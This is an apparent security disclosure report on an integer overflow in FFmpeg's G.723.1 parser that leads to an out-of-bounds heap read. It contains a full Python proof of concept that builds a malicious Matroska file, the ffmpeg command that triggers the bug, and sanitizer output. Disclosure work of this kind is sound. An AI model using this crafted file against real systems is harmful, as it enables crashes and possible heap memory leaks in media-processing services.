## Bug0: Signed Integer Overflow in g723_1_parse() Leading to Out-of-Bounds Read

### Summary

In `libavcodec/g723_1_parser.c` line 41, `g723_1_parse()` computes `next = frame_size[buf[0] & 3] * FFMAX(1, avctx->ch_layout.nb_channels)` with no overflow guard. When a crafted Matroska container supplies `nb_channels = 178956971`, the type-0 frame multiplication `24 * 178956971 = 4294967304` overflows a signed 32-bit integer (undefined behavior, UBSAN-confirmed). For type-1 frames the wrapped result is `-715827876`; `ff_combine_frame()` receives this negative `next` value, sets `pc->overread_index` to a large negative offset, and the overread copy loop reads memory far outside the `ParseContext.buffer` heap allocation, causing an out-of-bounds read (CWE-125) that reliably crashes the process (DoS) and may leak heap contents.

### PoC

A Python script generates a minimal 167-byte Matroska file carrying a G.723.1 audio track with `nb_channels = 178956971` encoded in the EBML Channels element; `ffmpeg` with `-codec_whitelist none` is used to keep the oversized channel count in the parser context while still reaching the vulnerable multiply.

```python
#!/usr/bin/env python3
"""
PoC: Signed integer overflow in g723_1_parse() -> OOB read via ff_combine_frame()
Generates a crafted Matroska file and triggers the bug with ffmpeg.
"""

import struct, os

OUTPUT_FILE = "poc_g723_1_overflow.mkv"
NB_CHANNELS = 178956971  # 0x0AAAAAAB — causes signed int overflow in g723_1_parse()


def encode_ebml_id(id_int):
    if id_int <= 0xFF:           return bytes([id_int])
    elif id_int <= 0xFFFF:       return struct.pack('>H', id_int)
    elif id_int <= 0xFFFFFF:     return struct.pack('>I', id_int)[1:]
    else:                        return struct.pack('>I', id_int)

def encode_ebml_size(n):
    if n < 0x7F:          return bytes([0x80 | n])
    elif n < 0x3FFF:      return struct.pack('>H', 0x4000 | n)
    elif n < 0x1FFFFF:    return struct.pack('>I', 0x200000 | n)[1:]
    elif n < 0x0FFFFFFF:  return struct.pack('>I', 0x10000000 | n)
    else:                 return struct.pack('>Q', 0x0100000000000000 | n)

def make_uint_bytes(n):
    if n == 0: return b'\x00'
    return n.to_bytes((n.bit_length() + 7) // 8, 'big')

def ebml_elem(id_int, data):
    if isinstance(data, int):   data = make_uint_bytes(data)
    elif isinstance(data, str): data = data.encode('ascii')
    return encode_ebml_id(id_int) + encode_ebml_size(len(data)) + data

def ebml_float64(f):
    return struct.pack('>d', f)

# EBML / Matroska element IDs
EBML_ID_HEADER            = 0x1A45DFA3
EBML_ID_EBMLVERSION       = 0x4286
EBML_ID_EBMLREADVERSION   = 0x42F7
EBML_ID_EBMLMAXIDLENGTH   = 0x42F2
EBML_ID_EBMLMAXSIZELENGTH = 0x42F3
EBML_ID_DOCTYPE           = 0x4282
EBML_ID_DOCTYPEVERSION    = 0x4287
EBML_ID_DOCTYPEREADVERSION= 0x4285
MATROSKA_ID_SEGMENT       = 0x18538067
MATROSKA_ID_INFO          = 0x1549A966
MATROSKA_ID_TIMECODESCALE = 0x2AD7B1
MATROSKA_ID_TRACKS        = 0x1654AE6B
MATROSKA_ID_TRACKENTRY    = 0xAE
MATROSKA_ID_TRACKNUMBER   = 0xD7
MATROSKA_ID_TRACKUID      = 0x73C5
MATROSKA_ID_TRACKTYPE     = 0x83
MATROSKA_ID_TRACKFLAGLACING = 0x9C
MATROSKA_ID_CODECID       = 0x86
MATROSKA_ID_CODECPRIVATE  = 0x63A2
MATROSKA_ID_TRACKAUDIO    = 0xE1
MATROSKA_ID_AUDIOSAMPLINGFREQ = 0xB5
MATROSKA_ID_AUDIOCHANNELS = 0x9F
MATROSKA_ID_CLUSTER       = 0x1F43B675
MATROSKA_ID_CLUSTERTIMECODE = 0xE7
MATROSKA_ID_SIMPLEBLOCK   = 0xA3
EBML_UNKNOWN_SIZE = bytes([0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])

# WAVEFORMATEX: G.723.1 codec tag, nChannels=0 (forces MKV demuxer to use EBML Channels)
waveformatex = struct.pack('<HHIIH', 0x0042, 0, 8000, 800, 24)

audio_inner = (ebml_elem(MATROSKA_ID_AUDIOSAMPLINGFREQ, ebml_float64(8000.0)) +
               ebml_elem(MATROSKA_ID_AUDIOCHANNELS, NB_CHANNELS))
audio_elem  = ebml_elem(MATROSKA_ID_TRACKAUDIO, audio_inner)

track_body = (ebml_elem(MATROSKA_ID_TRACKNUMBER, 1) +
              ebml_elem(MATROSKA_ID_TRACKUID, 1) +
              ebml_elem(MATROSKA_ID_TRACKTYPE, 2) +
              ebml_elem(MATROSKA_ID_TRACKFLAGLACING, 0) +
              ebml_elem(MATROSKA_ID_CODECID, "A_MS/ACM") +
              ebml_elem(MATROSKA_ID_CODECPRIVATE, waveformatex) +
              audio_elem)
tracks = ebml_elem(MATROSKA_ID_TRACKS, ebml_elem(MATROSKA_ID_TRACKENTRY, track_body))
info   = ebml_elem(MATROSKA_ID_INFO,   ebml_elem(MATROSKA_ID_TIMECODESCALE, 1000000))

# G.723.1 type-0 frame: first byte=0x00, low 2 bits=0 → frame_size[0]=24
g723_frame       = bytes(24)
simpleblock_data = bytes([0x81, 0x00, 0x00, 0x80]) + g723_frame
cluster = ebml_elem(MATROSKA_ID_CLUSTER,
                    ebml_elem(MATROSKA_ID_CLUSTERTIMECODE, 0) +
                    ebml_elem(MATROSKA_ID_SIMPLEBLOCK, simpleblock_data))

segment_body = info + tracks + cluster
segment = (encode_ebml_id(MATROSKA_ID_SEGMENT) + EBML_UNKNOWN_SIZE + segment_body)

header_body = (ebml_elem(EBML_ID_EBMLVERSION, 1) +
               ebml_elem(EBML_ID_EBMLREADVERSION, 1) +
               ebml_elem(EBML_ID_EBMLMAXIDLENGTH, 4) +
               ebml_elem(EBML_ID_EBMLMAXSIZELENGTH, 8) +
               ebml_elem(EBML_ID_DOCTYPE, "matroska") +
               ebml_elem(EBML_ID_DOCTYPEVERSION, 4) +
               ebml_elem(EBML_ID_DOCTYPEREADVERSION, 2))
header = ebml_elem(EBML_ID_HEADER, header_body)

with open(OUTPUT_FILE, 'wb') as f:
    f.write(header + segment)

print(f"[+] Generated {OUTPUT_FILE} ({os.path.getsize(OUTPUT_FILE)} bytes)")
print(f"[+] nb_channels={NB_CHANNELS}: 24*nb_channels={24*NB_CHANNELS} overflows int32")
```

```bash
# Step 1: generate the crafted MKV file
python3 poc_g723_1_overflow.py

# Step 2: trigger the overflow in g723_1_parse()
# -codec_whitelist 'none' keeps nb_channels in the parser avctx
# (avcodec_open2 fails before resetting ch_layout, so nb_channels stays at 178956971)
ffmpeg -codec_whitelist 'none' -i poc_g723_1_overflow.mkv -f null -
```

### Result

Running the above command against an ASAN+UBSAN build produces the following sanitizer report at the exact vulnerable line, confirming the signed integer overflow:

```
src/libavcodec/g723_1_parser.c:41:14: runtime error: signed integer overflow: 24 * 178956971 cannot be represented in type 'int'
```

The stream is parsed as `Audio: g723_1, 8000 Hz, 178956971 channels`, demonstrating that the oversized channel count reaches `g723_1_parse()` unchecked. In a release build (no sanitizers), the type-0 overflow wraps to `8` and a subsequent type-1 frame wraps to `-715827876`; `ff_combine_frame()` then sets `pc->overread_index` to that negative value and the overread copy loop performs an out-of-bounds read on the heap buffer, crashing the process (DoS) with potential for heap content disclosure.
